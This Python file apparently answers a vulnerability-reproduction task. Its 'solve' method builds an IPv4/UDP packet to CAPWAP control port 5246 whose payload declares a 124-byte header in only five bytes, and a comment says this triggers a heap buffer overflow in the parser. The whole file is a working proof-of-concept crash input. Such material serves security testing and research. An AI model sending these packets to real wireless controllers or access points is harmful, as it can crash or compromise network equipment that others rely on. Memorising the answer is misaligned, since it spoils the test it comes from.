import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct IPv4 Header
        # Version 4, IHL 5 (20 bytes)
        ip_ver_ihl = 0x45
        ip_tos = 0
        # Total Length: 20 (IP) + 8 (UDP) + 5 (Payload) = 33 bytes
        ip_total_len = 33
        ip_id = 1
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = 17  # UDP
        ip_check = 0
        ip_src = b'\x7f\x00\x00\x01' # 127.0.0.1
        ip_dst = b'\x7f\x00\x00\x01' # 127.0.0.1

        # Pack header with zero checksum to calculate it
        header_fmt = '!BBHHHBBH4s4s'
        header_raw = struct.pack(header_fmt, ip_ver_ihl, ip_tos, ip_total_len, 
                                 ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, 
                                 ip_src, ip_dst)

        # Calculate IP checksum
        s = 0
        for i in range(0, len(header_raw), 2):
            w = (header_raw[i] << 8) + header_raw[i+1]
            s += w
        
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        ip_check = ~s & 0xffff

        # Repack header with correct checksum
        ip_header = struct.pack(header_fmt, ip_ver_ihl, ip_tos, ip_total_len, 
                                ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, 
                                ip_src, ip_dst)

        # Construct UDP Header
        udp_src = 12345
        udp_dst = 5246  # CAPWAP Control Port
        udp_len = 13    # 8 header + 5 payload
        udp_check = 0   # Optional for IPv4

        udp_header = struct.pack('!HHHH', udp_src, udp_dst, udp_len, udp_check)

        # Construct Payload (5 bytes)
        # Byte 0: 0x00 (CAPWAP Preamble)
        # Byte 1: 0xF8 (HLen = 31 -> Header Length 124 bytes)
        # This causes the heap buffer overflow as the parser tries to read 
        # beyond the 5-byte payload based on the extracted header length.
        payload = b'\x00\xF8\x00\x00\x00'

        return ip_header + udp_header + payload